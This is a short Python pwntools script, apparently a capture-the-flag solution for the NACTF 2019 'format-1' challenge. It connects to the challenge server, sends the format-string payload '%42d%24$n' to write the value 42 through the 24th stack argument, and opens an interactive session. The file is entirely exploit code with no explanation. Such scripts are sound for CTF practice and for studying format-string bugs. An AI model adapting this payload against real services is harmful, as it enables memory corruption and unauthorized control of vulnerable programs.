#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# context(log_level="debug", arch="i386", os="linux")
# p = process('./format-1')
p = remote('shell.2019.nactf.com', 31560)
# gdb.attach(p, "b *0x08049266\nc\nsi")

pd = '%42d%24$n'
p.sendline(pd)

p.interactive()
